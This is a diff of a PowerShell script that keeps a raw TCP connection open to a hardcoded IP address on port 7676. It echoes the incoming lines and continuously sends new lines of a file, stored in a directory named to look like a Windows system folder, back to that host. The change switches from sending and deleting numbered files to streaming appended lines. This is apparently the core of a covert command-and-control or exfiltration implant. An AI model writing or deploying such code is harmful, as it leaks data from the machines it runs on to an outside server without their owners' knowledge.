@@ -1,8 +1,7 @@
 $FTPServer = '23.95.80.128';
 $FTPPort = '7676';
-$inputCounter = 0;
-$outputCounter = 0;
 $testConnection=0; 
+$lineCounter = 0;
 
 while(1){
     $tcpConnection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort);
@@ -17,23 +16,27 @@ while(1){
     while ($tcpConnection.Connected) {
         while ($tcpStream.DataAvailable -or $reader.Peek() -ne -1 ) {  
             write-host $reader.ReadLine(); 
-            <#$path = -join('C:\Program Files\Windows system\input', $inputCounter,'.txt');
-            Set-Content -Path $path -Value $reader.ReadLine();#>
             $inputCounter+=1;
         }
     
     
-        $pathOutput = -join('C:\Program Files\Windows system\output',$outputCounter,'.txt');
-        if(Test-Path $pathOutput){
-            $output = Get-Content $pathOutput;
-            if($output.length -ge 1){
+        $pathOutput = -join('C:\Program Files\Windows system\output.txt');
+        
+        $output = Get-Content $pathOutput | select-object -skip $lineCounter;
+        if($output -ne $null){
+            if($output.getType().Name -eq ""String""){
+                $lineCounter += 1;
+                $writer.WriteLine($output);
+            }else {
+                $lineCounter += $output.length;
                 Foreach($s in $output){
                     $writer.WriteLine($s);
-                };  
-            };
-            $outputCounter+=1;
-            Remove-Item $pathOutput;
-        };
+                } 
+            }
+        }
+        
+      
+        
     
         start-sleep -Milliseconds 120;
         $testConnection+=1;
